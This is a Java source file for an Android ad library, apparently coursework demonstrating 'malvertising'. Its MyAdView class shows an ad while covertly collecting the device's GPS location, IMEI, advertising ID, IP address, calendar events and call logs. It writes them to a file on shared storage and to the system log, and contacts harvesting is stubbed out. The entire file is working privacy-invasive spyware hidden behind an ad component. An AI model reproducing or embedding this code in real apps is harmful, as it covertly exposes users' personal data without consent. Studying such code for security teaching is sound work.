package uk.ac.imperial.apss.android.comp70004.cw2.myadlibrary;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;

import android.provider.ContactsContract;
import android.util.Log;
import android.widget.TextView;

import android.net.Uri;
import android.location.Location;
import android.location.LocationManager;

import androidx.core.app.ActivityCompat;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;

import java.io.*;
import java.util.Enumeration;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import static android.content.Context.LOCATION_SERVICE;

public class MyAdView {
    private static final String TAG = "CW2: MyAdView";
    private static final String LOG_TAG = "Exception getting IP";
    @SuppressLint("StaticFieldLeak")
    public static Context ctx;
    public static boolean isLAT = false;
    private static File filePart1Malad;

    @SuppressLint("SetTextI18n")
    public static void loadAd(TextView tv, Context ctx) {
        MyAdView.ctx = ctx;

        File root = android.os.Environment.getExternalStorageDirectory();
        File dir = new File(root.getAbsolutePath() + "/download");
        boolean makeDirs = dir.mkdirs();
        MyAdView.filePart1Malad = new File(dir, "Part1_malad.txt");

        tv.setText("Hello Ad! This has been changed!!");

        try {
            onLoad();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    private static void onLoad() throws FileNotFoundException {

        // For Part 2A
        Log.i("*", "************************ HELLO MALVERTISING ************************");

        // Clear file contents
        PrintWriter writer = new PrintWriter(filePart1Malad);
        writer.print("");
        writer.close();

        SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        String currentDateandTime = null;

        // GET LOCATION
        String location = getLocation();
        writeToFile(filePart1Malad, "************************ LOCATION ************************");
        currentDateandTime = sdf.format(new Date());
        location = currentDateandTime + ";" + location;
        writeToFile(filePart1Malad, location);
        Log.i("*", "************************ LOCATION ************************");
        Log.i("LOCATION: ", location);
        
        // GET IMEI
        String imei = getIMEI();
        writeToFile(filePart1Malad, "************************ IMEI ************************");
        currentDateandTime = sdf.format(new Date());
        imei = currentDateandTime + ";" + imei;
        writeToFile(filePart1Malad, imei);
        Log.i("*", "************************ IMEI ************************");
        Log.i("IMEI: ", imei);
        
        // GET ADVERTISING ID
        // According to docs Ad ID cannot be retrieved from main thread
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                try {
                    String AdID = getAdId();
                    writeToFile(filePart1Malad, "************************ Advertising ID ************************");
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
                    String currentDateandTime = sdf.format(new Date());
                    AdID = currentDateandTime + ";" + AdID;
                    writeToFile(filePart1Malad, AdID);
                    Log.i("*", "************************ Advertising ID ************************");
                    Log.i("Advertising ID: ", AdID);
                } catch (IOException | GooglePlayServicesRepairableException | GooglePlayServicesNotAvailableException exception) {

                }
            }
        });

        // GET CONTACTS
        /*
        Uncommenting the line below will throw a security exception because we do not have the
        permission android.permission.READ_CONTACTS
        */
        // getContacts();


        
        // GET IP ADDRESS
        String ipAddress = getIpAddress();
        writeToFile(filePart1Malad, "************************ IP ADDRESS ************************");
        writeToFile(filePart1Malad, ipAddress);
        Log.i("*", "************************ IP Address ************************");
        Log.i("IP ADDRESS: ", ipAddress);
        
        // GET CALENDAR EVENTS
        Calendar c_start = Calendar.getInstance();
        c_start.set(2020, 10, 1, 0, 0); //Note that months start from 0 (January)
        Calendar c_end = Calendar.getInstance();
        c_end.set(2021, 1, 1, 0, 0); //Note that months start from 0 (January)

        String calendar = getCalendar(c_start, c_end);
        writeToFile(filePart1Malad, "************************ CALENDAR EVENTS ************************");
        writeToFile(filePart1Malad, calendar);
        Log.i("*", "************************ CALENDAR EVENTS ************************");
        Log.i("CALENDAR EVENTS: ", calendar);

        // GET CALL LOGS
        String callLogs = getCallLog();
        writeToFile(filePart1Malad, "\n************************ CALL LOGS ************************");
        writeToFile(filePart1Malad, callLogs);
        Log.i("*", "************************ CALL LOGS ************************");
        Log.i("CALL LOGS: ", callLogs);
    }

    public static String getLocation() {
        double longitude = 0;
        double latitude = 0;
        LocationManager locationManager = (LocationManager) ctx.getSystemService(LOCATION_SERVICE);
        String gpsProvider = LocationManager.GPS_PROVIDER;

        if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return null;
        }

        Location location = locationManager.getLastKnownLocation(gpsProvider);
        if (location != null) {
            longitude = location.getLongitude();
            latitude = location.getLatitude();
        }

        String locationString = "longitude:" + longitude + ";latitude:" + latitude;
        return locationString;
    }

    @SuppressLint("HardwareIds")
    public static String getIMEI (){
        String phone_imei = "";
        TelephonyManager phone_manager = (TelephonyManager)ctx.getSystemService(Context.TELEPHONY_SERVICE);
        phone_imei = "IMEI:" + phone_manager.getDeviceId();
        return phone_imei;
    }

    public static String getAdId () throws GooglePlayServicesNotAvailableException, IOException, GooglePlayServicesRepairableException {
        AdvertisingIdClient.Info adInfo = null;
        adInfo = AdvertisingIdClient.getAdvertisingIdInfo(ctx);
        String AdId = adInfo.getId();
        AdId = "advertising_id:" + AdId;
        return AdId;
    }

    public static void getContacts() {
        ContentResolver resolver = ctx.getContentResolver();
        Cursor contacts = null;
        contacts = resolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
    }

    public static String getIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = (NetworkInterface) ((Enumeration) en).nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        String hostAddress = inetAddress.getHostAddress();
                        return hostAddress;
                    }
                }
            }
        } catch (SocketException ex) {
            Log.e(LOG_TAG, ex.toString());
        }
        return null;
    }

    public static String getCalendar(Calendar c_start, Calendar c_end){
        // Gets calendar events between input dates
        String selection = "((dtstart >= "+c_start.getTimeInMillis()+") AND (dtend <= "+c_end.getTimeInMillis()+"))";

        Cursor cursor = ctx.getContentResolver().query(Uri.parse("content://com.android.calendar/events"), new String[]{ "calendar_id", "title", "description", "dtstart", "dtend", "eventLocation" }, selection, null, null);

        StringBuilder add = null;
        cursor.moveToFirst();
        System.out.println("count: " + cursor.getCount());
        String[] CalNames = new String[cursor.getCount()];
        int[] CalIds = new int[cursor.getCount()];
        for(int i = 0; i < CalNames.length; i++) {
            CalIds[i] = cursor.getInt(0);
            CalNames[i] = "Event"+cursor.getInt(0)+": \nTitle: "+ cursor.getString(1)+"\nDescription: "+cursor.getString(2)+"\nStart Date: "+new Date(cursor.getLong(3))+"\nEnd Date : "+new Date(cursor.getLong(4))+"\nLocation : "+cursor.getString(5);
            if(add == null)
                add = new StringBuilder(CalNames[i]);
            else{
                add.append(CalNames[i]);
            }
            cursor.moveToNext();
        }
        cursor.close();

        String calendarString = Arrays.toString(CalNames);
        return calendarString;
    }

    public static String getCallLog() {
        String[] projection = new String[] {
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE
        };

        Cursor cursor =  ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, null);
        String[] callLogs = new String[cursor.getCount()];
        int i = 0;
        while (cursor.moveToNext()) {
            String name = cursor.getString(0);
            String number = cursor.getString(1);
            String type = cursor.getString(2);
            String time = cursor.getString(3);
            callLogs[i] = "Name: " + name + ", Number: " +  number + " Type: " + type + " Time: " + time;
            i ++;
        }
        cursor.close();

        String callLogsString = Arrays.toString(callLogs);
        return callLogsString;
    }

    public static void writeToFile(File file, String data) {
        FileOutputStream f = null;
        try {
            f = new FileOutputStream(file, true);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        PrintWriter pw = new PrintWriter(f);
        pw.println(data + "\n\n");
        pw.flush();
        pw.close();
        try {
            assert f != null;
            f.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}